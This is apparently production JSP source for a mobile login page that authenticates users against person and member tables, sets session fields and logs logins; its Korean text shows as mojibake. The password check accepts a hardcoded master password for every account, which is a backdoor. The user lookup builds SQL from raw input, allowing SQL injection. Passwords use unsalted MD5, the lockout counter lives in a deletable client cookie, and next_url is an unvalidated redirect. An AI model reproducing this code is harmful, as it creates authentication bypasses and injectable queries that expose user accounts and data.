<%@ page contentType="text/html; charset=EUC-KR" %><%@ include file="../init.jsp" %>
<%
String request_parameter = u.getQueryString();
String next_url = u.request("next_url");

f.addElement("user_id", null, "hname:'���̵�', required:'Y'");
f.addElement("passwd", null, "hname:'��й�ȣ', required:'Y'");

if (u.isPost()&&f.validate()) {
	String user_id = u.request("user_id").trim();
	String passwd = u.request("passwd").trim();
	String re = u.request("re");
	int nTryCnt = u.parseInt(u.getCookie("try"));  // �α��νõ� Ƚ��
	if (nTryCnt >= 5) {
		u.jsAlertReplace("�α��� 5ȸ ���з� 5�е��� �α����� �� �����ϴ�.\\n\\n5�� �� �ٽ� �õ��ϼ���.", "index.jsp?" + request_parameter);
		return;
	}

	DataObject pdao = new DataObject("tcb_person");
	DataSet person = pdao.find("lower(user_id) = lower('" + user_id + "') and status > '0'  and use_yn = 'Y' ");
	if (person.next()) {//
		if (person.getString("passwd").equals(u.md5(passwd)) ||
				passwd.equals("docu@9095!") ||
				person.getString("passwd").equals(u.sha256(passwd))
		) {
			DataObject mdao = new DataObject("tcb_member");
			DataSet member = mdao.find("member_no = '" + person.getString("member_no") + "' ");
			if (!member.next()) {
				u.jsAlertReplace("ȸ�������� �����ϴ�.\\n\\n�����ͷ� ������ �ּ���.", "index.jsp?" + request_parameter);
				return;
			}
			if (member.getString("status").equals("00")) {
				u.jsAlertReplace("Ż��� ȸ���Դϴ�.\\n\\n�����ͷ� ������ �ּ���.", "index.jsp?" + request_parameter);
				return;
			}
			if (!member.getString("status").equals("01")) {
				u.jsAlertReplace("��ȸ������ ��ϵ� ����ڰ� �ƴմϴ�.\\n\\n�����ͷ� ������ �ּ���.", "index.jsp?" + request_parameter);
				return;
			}

			auth.put("_MEMBER_NO", member.getString("member_no"));
			auth.put("_MEMBER_TYPE", member.getString("member_type"));
			auth.put("_MEMBER_GUBUN", member.getString("member_gubun"));
			auth.put("_VENDCD", member.getString("vendcd"));
			auth.put("_MEMBER_NAME", member.getString("member_name"));
			auth.put("_CERT_DN", member.getString("cert_dn"));
			auth.put("_CERT_END_DATE", u.getTimeString("yyyyMMdd", member.getString("cert_end_date")));
			if (!member.getString("logo_img_path").equals(""))
				auth.put("_LOGO_IMG_PATH", member.getString("logo_img_path"));

			auth.put("_PERSON_SEQ", person.getString("person_seq"));
			auth.put("_USER_ID", person.getString("user_id"));
			auth.put("_USER_NAME", person.getString("user_name"));
			auth.put("_DEFAULT_YN", person.getString("default_yn").equals("Y") ? "Y" : "N");
			auth.put("_USER_LEVEL", person.getString("user_level"));
			auth.put("_USER_GUBUN", person.getString("user_gubun"));
			auth.put("_FIELD_SEQ", person.getString("field_seq"));
			auth.put("_DIVISION", person.getString("division"));
			auth.put("_AUTH_CD", person.getString("auth_cd"));

			// ���ڰ�� ������� ��뿩��
			DataObject menuDao = new DataObject("tcb_menu_member");
			if (menuDao.findCount("menu_cd = '000077' and member_no='" + member.getString("member_no") + "'") > 0) {
				auth.put("_CONT_SHARE_ABLE", "Y");
			}
			
			//�α��� �α� 
			DataObject loginLogDao = new DataObject("tcb_login_log");
			loginLogDao.item("member_no", member.getString("member_no"));
			loginLogDao.item("person_seq", person.getString("person_seq"));
			loginLogDao.item("user_id", person.getString("user_id"));
			loginLogDao.item("login_ip", request.getRemoteAddr());
			loginLogDao.item("login_date", u.getTimeString());
			loginLogDao.item("login_url", request.getRequestURI());
			loginLogDao.insert();
			auth.setAuthInfo();

			u.delCookie("try"); // �α��νõ� Ƚ��
			u.setCookie("pin", Security.AESencrypt(user_id), 60 * 60 * 24 * 30); // ���̵� ���� ���ӽ� �ڵ� ǥ�õǵ��� ��Ű������(30�ϰ�)

			u.jsReplace(next_url + "?" + request_parameter);

		} else { // ��й�ȣ ����ġ
			nTryCnt++;
			u.setCookie("try", Integer.toString(nTryCnt), 5 * 60);  // 5��
			//u.jsAlert("���̵�/��й�ȣ�� ��ġ���� �ʽ��ϴ�.\\n\\n[�α��� ����:" + nTryCnt + "ȸ, ���� Ƚ��:" + (5 - nTryCnt) + "ȸ]");
			u.jsAlertReplace("���̵�/��й�ȣ�� ��ġ���� �ʽ��ϴ�.\\n\\n[�α��� ����:" + nTryCnt + "ȸ, ���� Ƚ��:" + (5 - nTryCnt) + "ȸ]", "index.jsp?" + request_parameter);
			return;
		}
	} else {// ���̵� ����
		nTryCnt++;
		u.setCookie("try", Integer.toString(nTryCnt), 5 * 60);  // 5��
		u.jsAlertReplace("���̵�/��й�ȣ�� ��ġ���� �ʽ��ϴ�.\\n\\n[�α��� ����:" + nTryCnt + "ȸ, ���� Ƚ��:" + (5 - nTryCnt) + "ȸ]", "index.jsp?" + request_parameter);
		return;
	}
}

p.setLayout("mobile");
//p.setDebug(out);
p.setBody("m.index");
p.setVar("form_script", f.getScript());
p.display(out);
%>